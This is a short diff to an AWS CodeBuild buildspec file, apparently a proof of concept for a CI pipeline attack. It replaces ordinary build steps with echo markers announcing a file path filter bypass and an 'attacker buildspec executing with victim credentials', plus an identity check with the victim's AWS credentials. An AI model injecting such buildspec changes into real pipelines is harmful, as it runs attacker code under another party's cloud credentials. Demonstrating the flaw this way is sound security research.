@@ -2,5 +2,7 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Legitimate build"
-      - echo "Build completed"
+      - echo FILE_PATH_FILTER_BYPASS_CONFIRMED
+      - echo Attacker buildspec executing with victim credentials
+      - aws sts get-caller-identity
+      - echo EXPLOIT_SUCCESSFUL
